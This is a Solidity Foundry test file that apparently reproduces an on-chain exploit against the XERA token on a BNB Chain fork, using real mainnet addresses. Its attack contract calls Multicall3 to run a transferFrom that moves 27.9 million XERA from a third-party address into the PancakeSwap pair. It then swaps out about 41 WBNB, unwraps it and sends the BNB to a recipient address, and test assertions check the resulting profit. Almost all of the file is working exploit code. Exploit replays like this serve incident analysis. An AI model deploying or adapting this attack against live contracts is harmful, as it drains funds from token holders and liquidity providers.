
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 58269338;
    uint256 constant TX_TIMESTAMP = 1755700171;
    uint256 constant TX_BLOCK_NUMBER = 58269339;
    uint256 constant TX_VALUE = 58269347;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttackContrac();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttackContrac() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntimeFallb();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return address(0);
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _installRuntimeFallb() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_484848_4848, address(0), Addresses.ZERO, "BNB", 20517302684356598552);
        _expectProfit(Addresses.attack_contract, ATTACKER_EOA, Addresses.ZERO, "BNB", 20517445489254537840);
    }
}

contract OurAttack {
    function attack() external payable {
        _executeSwapPath();
    }

    function _executeSwapPath() internal {
        {
            Abi_aggregate3_Param0[] memory abiArg0 = new Abi_aggregate3_Param0[](1);
            abiArg0[0] = Abi_aggregate3_Param0({
                field0: Addresses.XERA,
                field1: false,
                field2: abi.encodeWithSelector(
                    IERC20Like.transferFrom.selector,
                    Addresses.A_9A619A_C542,
                    Addresses.Cake_LP,
                    uint256(27900000000000000000000000)
                )
            });
            IMulticall3(Addresses.Multicall3).aggregate3(abiArg0);
        }
        IUniswapV2PairLike(Addresses.Cake_LP).swap(0, 41034748173552867045, address(this), hex"");
        uint256 withdrawAmount = 41034748173552867045;
        IWBNB(Addresses.WBNB).withdraw(withdrawAmount);
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 20517302684356598552) nativeTransferAmount = 20517302684356598552;
            (bool ok,) = payable(Addresses.A_484848_4848).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
    }

    function _runExploitPath2() internal {
        replayedCallback2 = true;
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x00dd0000) {
            _executeSwapPath();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    bool private replayedCallback2;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _tryHelperAt(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attacker_eoa = 0x00B700B9da0053009cb84400Ed1e8Fe251002aF3;
    address internal constant DividendTracker = 0x02055174DbC8ebdFc0b2accBb21da5deDc29956D;
    address internal constant Cake_LP = 0x231075E4AA60d28681a2d6D4989F8F739BAC15a0;
    address internal constant A_2F89EB_8638 = 0x2f89ebBa798fc0815DbcA9f906C529c6C6d18638;
    address internal constant A_484848_4848 = 0x4848489f0b2BEdd788c696e2D79b6b69D7484848;
    address internal constant A_4FD342_5B88 = 0x4FD342fDe1ffC3d63cf6D7Ceed5A239001E95b88;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant A_700A21_E5D0 = 0x700a21330c151b69aCc3324a08A5668d7569E5D0;
    address internal constant attack_contract = 0x90bE00229fE8000000009e007743A485d400C3B7;
    address internal constant XERA = 0x93E99aE6692b07A36E7693f4ae684c266633b67d;
    address internal constant A_9A619A_C542 = 0x9a619Ae8995A220E8f3A1Df7478A5c8d2afFc542;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant Multicall3 = 0xcA11bde05977b3631167028862bE2a173976CA11;
    address internal constant A_F19C71_E39E = 0xf19C71cad03a283cD006781dD1ccF327C552E39E;
}

struct Abi_aggregate3_Param0 {
    address field0;
    bool field1;
    bytes field2;
}

interface IMulticall3 {
    function aggregate3(Abi_aggregate3_Param0[] calldata) external;
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IWBNB {
    function withdraw(uint256) external;
}
